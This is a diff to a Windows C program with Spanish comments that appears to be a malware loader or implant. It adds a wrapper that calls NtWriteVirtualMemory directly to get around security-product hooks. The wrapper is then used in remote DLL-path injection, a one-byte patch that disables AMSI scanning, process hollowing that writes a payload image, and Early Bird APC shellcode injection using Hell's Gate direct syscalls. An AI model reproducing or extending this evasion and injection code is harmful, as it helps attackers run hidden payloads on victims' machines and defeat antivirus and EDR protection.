@@ -270,7 +270,7 @@ NTSYSAPI VOID NTAPI RtlInitUnicodeString(
     PCWSTR SourceString
 );
 
-
+NTSYSAPI ULONG NTAPI RtlNtStatusToDosError(NTSTATUS Status);
 
 // Convierte UTF-8 a wide string
 WCHAR* UTF8ToWide(const char* utf8) {
@@ -687,7 +687,35 @@ HANDLE CreateFileA_Unhooked(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwSh
 
     return hFile;
 }
-// User-Agents (como en tu Go)
+// Wrapper para reemplazar WriteProcessMemory con NtWriteVirtualMemory unhooked
+BOOL WriteProcessMemory_Unhooked(
+    HANDLE hProcess,
+    LPVOID lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T nSize,
+    SIZE_T* lpNumberOfBytesWritten
+) {
+    if (!g_pNtWriteVirtualMemoryUnhooked) {
+        // Fallback a WriteProcessMemory si el stub no está disponible
+        return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
+    }
+
+    NTSTATUS status = g_pNtWriteVirtualMemoryUnhooked(
+        hProcess,
+        lpBaseAddress,
+        (PVOID)lpBuffer,
+        nSize,
+        (PSIZE_T)lpNumberOfBytesWritten
+    );
+
+    if (!NT_SUCCESS(status)) {
+        SetLastError(RtlNtStatusToDosError(status));
+        return FALSE;
+    }
+
+    return TRUE;
+}
+// User-Agents
 const char* USER_AGENTS[] = {
     "$USER_AGENT",
     "$USER_AGENT1",
@@ -1280,8 +1308,8 @@ BOOL LoadModuleFromURL(const char* url) {
         }
 
         // --- 6. Escribir ruta en memoria remota ---
-        if (!WriteProcessMemory(hProcess, pRemotePath, tempPath, strlen(tempPath) + 1, NULL)) {
-            printf("[-] WriteProcessMemory falló (ruta)\n");
+        if (!WriteProcessMemory_Unhooked(hProcess, pRemotePath, tempPath, strlen(tempPath) + 1, NULL)) {
+            printf("[-] WriteProcessMemory_Unhooked falló (ruta)\n");
             VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
             CloseHandle(hProcess);
             return FALSE;
@@ -3534,7 +3562,7 @@ BOOL patchAMSI(void) {
     DWORD old_protect;
     if (!VirtualProtect((LPVOID)scan_buffer_addr, 1, PAGE_EXECUTE_READWRITE, &old_protect)) { FreeLibrary(amsi_dll); return FALSE; }
     char patch[] = { 0xC3 };
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)scan_buffer_addr, patch, sizeof(patch), NULL);
+    WriteProcessMemory_Unhooked(GetCurrentProcess(), (LPVOID)scan_buffer_addr, patch, sizeof(patch), NULL);
     VirtualProtect((LPVOID)scan_buffer_addr, 1, old_protect, &old_protect);
     FreeLibrary(amsi_dll);
     return TRUE;
@@ -3806,8 +3834,8 @@ void overWrite(const char* targetPath, const char* payloadPath) {
 
     // === 4. Escribir payload completo ===
     SIZE_T written = 0;
-    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
-        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
+    if (!WriteProcessMemory_Unhooked(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
+        printf("[-] WriteProcessMemory_Unhooked failed: %lu\n", GetLastError());
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
@@ -4261,7 +4289,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     SIZE_T size = (shellcode_len + 4095) & ~4095;
     LPVOID pRemoteMem = NULL;
 
-    // 🔹 NtAllocateVirtualMemory (syscall)
+    // NtAllocateVirtualMemory (syscall)
     HellsGate(ssn_alloc);
     NTSTATUS status = HellDescent(
         (DWORD64)hProcess,
@@ -4283,9 +4311,9 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
     fflush(stdout);
     Sleep(GetJitteredSleep(SLEEP_BASE));
-    // 🔹 WriteProcessMemory (API normal, más estable que NtWriteVirtualMemory syscall)
-    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
-        printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
+    // WriteProcessMemory_Unhooked
+    if (!WriteProcessMemory_Unhooked(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
+        printf("[-] WriteProcessMemory_Unhooked falló: %lu\n", GetLastError());
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4297,7 +4325,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Shellcode escrito en proceso remoto.\n");
     fflush(stdout);
 
-    // 🔹 VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
+    // VirtualProtectEx (API normal) - más discreto que NtProtectVirtualMemory
     ULONG oldProtect = 0;
     if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
         printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
@@ -4309,7 +4337,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
     fflush(stdout);
 
-    // 🔹 NtQueueApcThread (syscall)
+    // NtQueueApcThread (syscall)
     HellsGate(ssn_apc);
     status = HellDescent(
         (DWORD64)hThread,
@@ -4326,7 +4354,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] APC enqueued via NtQueueApcThread.\n");
     fflush(stdout);
 
-    // 🔹 NtResumeThread (syscall)
+    // NtResumeThread (syscall)
     DWORD suspendCount;
     HellsGate(ssn_resume);
     status = HellDescent(
